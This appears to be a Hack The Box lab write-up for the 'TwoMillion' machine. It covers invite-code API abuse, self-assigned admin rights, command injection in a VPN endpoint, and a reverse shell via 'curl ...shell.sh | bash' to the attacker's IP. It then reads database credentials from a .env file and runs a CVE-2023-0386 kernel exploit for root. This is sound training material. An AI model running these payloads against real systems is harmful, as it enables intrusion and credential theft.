# TwoMillion
#HTB #easy #adventure-mode #burp-suite #CVE #networks-services #reverse-shell #privilege-escalation #Web #Linux 
## Target:
*Name*: TwoMillion

*IP:* 10.129.84.146
## Vulnerability:
- **Exposed/insecure invite-code generation**: obtain a valid invitation code and create an account.
- **API authorization flaw / privilege escalation**: Insufficient authorization checks allowed a regular user to modify their account privileges and become an administrator.
- **Command injection** in the admin VPN generation functionality.
- **Exposed `.env` credentials + password reuse**.
- **CVE-2023-0386 (OverlayFS/FUSE)**: The vulnerable kernel allowed a local unprivileged user to exploit OverlayFS and obtain root privileges through an improperly handled SUID file.
## Steps:
#### 1) Reconnaissance

**Code:**
```
nmap -p- 10.129.84.146
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 15:50 -0400
Nmap scan report for 10.129.84.146
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
```
The target machine has only two open ports: 
- `SSH` (port 22)
- `HTTP` (port 80)
#### 2) Investigating the web application
We tried to access the website using its IP, but we got redirected to `http://2million.htb` and the browser couldn't find that site. 

So we added it to `/etc/hosts` using the code:
```
echo "10.129.84.146 2million.htb" | sudo tee -a /etc/hosts
```
**Screenshot:**

<img width="2464" height="1321" alt="image" src="https://github.com/user-attachments/assets/874657ca-0d19-48ac-914e-e339b39af3e8" />

We found the following Invite page, where we can enter an invite code to register an account.

<img width="2468" height="1254" alt="image" src="https://github.com/user-attachments/assets/57fe9f2f-7392-47c4-8cd6-0dd943c76ed1" />

We used BurpSuite to inspect the page's response, and we found that it uses two scripts to validate the invite code. 

<img width="1148" height="716" alt="image" src="https://github.com/user-attachments/assets/47565a77-70a8-4e47-b3c0-f252e9aac127" />

The first script is `inviteapi.min.js` which we accessed directly in the browser:
```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

The JavaScript was obfuscated using `eval()`, so we deobfuscated it to reveal the hidden API endpoints used to verify and generate invite codes.

> [!NOTE] 
> **JavaScript obfuscation:** A technique that makes JavaScript code difficult to read by replacing or hiding its readable parts while keeping it executable.

**Deobfuscated Code:**

```javascript
function verifyInviteCode(code) {
    var formData = {
        code: code
    };

    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: "/api/v1/invite/verify",
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: "/api/v1/invite/how/to/generate",
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```
We concluded that we need to send a `POST` request to `/api/v1/invite/how/to/generate` in order to generate an invite code. 

**Response:**
```
{
    "0":200,
    "success":1,
    "data":{
           "data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
           "enctype":"ROT13"
           },
    "hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```
The data is encrypted using `ROT13`, a simple substitution cipher that replaces each letter with the letter 13 positions after it in the alphabet.
We can easily decrypt it:
```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```
We'll send another POST request to the correct destination.

**Request:**
```http
POST /api/v1/invite/generate HTTP/1.1
Host: 2million.htb
Content-Length: 0
```

**Result:**
```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 23 Aug 2026 19:09:59 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: PHPSESSID=e592cmtbr0496miq23if1fg3nq; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 91

{ 
   "0":200,
   "success":1,
   "data":{
           "code":"S1dZT08tWjBVVkstQ0tLWVYtSTExWUs=",
           "format":"encoded"
           }
}
```
The code is encoded using base64, we decoded it using CyberChef.

**Result:**
```
KWYOO-Z0UVK-CKKYV-I11YK
```
That's our generated invitation code, we'll use it to create an account.
**Screenshot:**

<img width="853" height="896" alt="image" src="https://github.com/user-attachments/assets/69c66f2e-a879-4d38-ac1a-430b7e5395e9" />

**Result:**

<img width="2426" height="1247" alt="image" src="https://github.com/user-attachments/assets/a33403b4-8f86-47a9-a74f-5f5b67975b08" />

The application contains a separate page for requesting a VPN configuration file: 

<img width="2455" height="1247" alt="image" src="https://github.com/user-attachments/assets/2e87a686-66d9-4006-94b4-95064dfc2495" />

#### 3) API Endpoint Enumeration

**Page request:**
```http
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
Connection: keep-alive
```
We'll investigate the `/api` directory: 

**Request:**
```http
GET /api/v1 HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
Connection: keep-alive
```

**Response:**
```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 23 Aug 2026 20:34:48 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 800

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
Next, we accessed the `/api/v1/admin/settings/update` endpoint:

**Request:**
```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
Content-Type: application/json
Content-Length: 2
```

**Response:**
```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 23 Aug 2026 20:47:11 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56

{"status":"danger","message":"Missing parameter: email"}
```
We provided our registered email:
```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
Content-Type: application/json
Content-Length: 31


{
"email":"naf@oaff.oiaf"
}
```

**Response:**
```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 23 Aug 2026 21:07:39 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 59

{"status":"danger","message":"Missing parameter: is_admin"}
```

The response indicated that the `is_admin` parameter was required. We therefore supplied it along with our registered email address:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
Content-Type: application/json

{
    "email": "naf@oaff.oiaf",
    "is_admin": 1
}
```

The server responded with:

```json
{
    "id": 14,
    "username": "zdqesfrg",
    "is_admin": 1
}
```

This confirms that the endpoint allows an authenticated user to modify their own `is_admin` attribute and successfully assign themselves administrative privileges.

We can therefore use the newly obtained administrative privileges to access the functionality exposed under the `/api/v1/admin/` endpoints.

#### 4) Investigating the VPN Generation Endpoint

**Request:**
```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
Content-Type: application/json
Content-Length: 2
```

**Response:**
```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 23 Aug 2026 21:13:07 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 59

{"status":"danger","message":"Missing parameter: username"}
```
The response indicated that the `username` parameter was required.
After some time, we discovered that `username` parameter was vulnerable to command injection.

**Test request:**
```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
Content-Type: application/json
Content-Length: 24

{ "username":"test;id;"}
```

**Response:**
```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 23 Aug 2026 21:19:19 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 54

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The response confirms that our injected command was executed with the privileges of the `www-data` user.

We'll exploit this vulnerability to execute commands on the server and obtain a reverse shell.
#### 5) Reverse shell
We used the same method explained in [Three](./Three) Box.
After setting up our reverse shell, we sent the payload to execute our `shell.sh` script on the target machine: `{ "username":"test;curl 10.10.15.212:8000/shell.sh | bash;"}` 

> [!NOTE]
> `10.10.15.212` is the attacker's machine IP.

**Result:**
```
connect to [10.10.15.212] from (UNKNOWN) [10.129.229.66] 35812
bash: cannot set terminal process group (1080): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ 
```
#### 6) Lateral movement
While enumerating the web application's files, we discovered a `.env` file containing credentials for the `admin` account. We used these credentials to authenticate as `admin` via SSH.

**Credentials found:**
```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

**SSH Authentication:**
```
ssh admin@10.129.229.66
```
**Result:**
```
admin@2million:~$ 
```
We were able to read the `user.txt` flag as the `admin` user.
```
admin@2million:~$ cat user.txt
<USER_FLAG>
```
#### 7) Privilege escalation

**Sources:** 
[https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
)
[https://nvd.nist.gov/vuln/detail/CVE-2026-68448](https://nvd.nist.gov/vuln/detail/CVE-2026-68448)

While enumerating the system as the `admin` user, we discovered an email in `/var/mail/admin` containing information about an OS upgrade and mentioning a potentially serious **OverlayFS / FUSE Linux kernel vulnerability**.

**Mail:**
```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
While searching for information about the **OverlayFS / FUSE vulnerability**, we discovered that it corresponds to **CVE-2023-0386**, a known Linux kernel vulnerability. This is a local privilege escalation vulnerability that allows an unprivileged user to potentially escalate their privileges to **root**.

Due to improper handling of file ownership and permissions when copying files from a FUSE filesystem into an OverlayFS mount, an unprivileged user can cause a file with privileged attributes, such as **SUID**, to be created.
This can allow the attacker to execute code with **root privileges**, resulting in a local privilege escalation from `admin` to `root`.

First, we checked the Linux kernel version by running the command `uname -r`.

Systems running a kernel version older than `6.2` may be vulnerable to **CVE-2023-0386**. The target machine is running kernel version `5.15.70`, indicating that it may be vulnerable to the **OverlayFS / FUSE vulnerability**. This also explains the warning mentioned in the email: the kernel had not yet been updated.

Second, we downloaded a public proof-of-concept (PoC) for CVE-2023-0386 from `https://github.com/puckiestyle/CVE-2023-0386` onto our Kali machine. We then transferred it to the target machine.

We compressed the exploit directory into a ZIP archive to make the transfer easier:
```
zip -r cve.zip CVE-2023-0386
```

Next, we started a Python HTTP server on port `8666` to serve the ZIP archive:
```
python3 -m http.server 8666
```

We then downloaded the archive from the target machine:
```
admin@2million:~$ wget http://10.10.15.212:8666/cve.zip
```

> [!NOTE] 
> 10.10.15.212 is the attacker's IP.

and we extracted the archive:
```
admin@2million:~$ unzip cve.zip
```
Finally, we lunched the exploit:
**First terminal:**
```
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
```
**Second terminal:**
```
admin@2million:~/CVE-2023-0386$ ./exp
```
**Result:**
```
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Aug 26 10:03 .
drwxrwxr-x 6 root   root     4096 Aug 26 10:03 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386# 
```

We can now easily read the `root.txt` flag:
```
root@2million:/root# cat root.txt
<ROOT_FLAG>
```
## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- Hidden or obfuscated JavaScript can reveal API endpoints and application logic.
- Exposing `.env` files can leak credentials and lead to further compromise, especially when passwords are reused.
- Outdated kernels can expose local privilege-escalation vulnerabilities such as **CVE-2023-0386**.
